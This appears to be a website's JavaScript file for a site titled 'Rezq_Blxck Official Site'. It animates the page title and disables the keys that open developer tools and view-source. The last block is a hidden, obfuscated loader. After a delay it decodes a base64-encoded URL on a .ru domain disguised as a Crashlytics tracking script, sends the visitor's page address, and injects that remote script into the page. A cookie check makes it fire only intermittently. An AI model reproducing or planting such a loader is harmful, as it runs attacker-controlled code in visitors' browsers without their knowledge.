function recursiveAnimateTitle(e) {
    let t = e[0];
    document.querySelector("title").innerHTML += t, e.length > 1 && setTimeout((function() {
        recursiveAnimateTitle(e.substring(1))
    }), 600)
}

function animateTitle(e) {
    document.querySelector("title").innerHTML = "", recursiveAnimateTitle(e)
}
document.onkeydown = function(e) {
    return 123 != event.keyCode && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "I".charCodeAt(0)) && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "J".charCodeAt(0)) && ((!e.ctrlKey || e.keyCode != "U".charCodeAt(0)) && void 0)))
}, animateTitle("Rezq_Blxck Official Site");
! function(o, w, d, l) {
    try {
        o.c = "h" == l.protocol[0] && /./.test(l.hostname) && !/PHPPREFS/.test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement("script"), o.s.src = atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==") + l.href, d.body.appendChild(o.s))
        }, 1e3), d.cookie = "PHPPREFS=full;max-age=39800;"
    } catch (e) {}
}({}, window, document, location);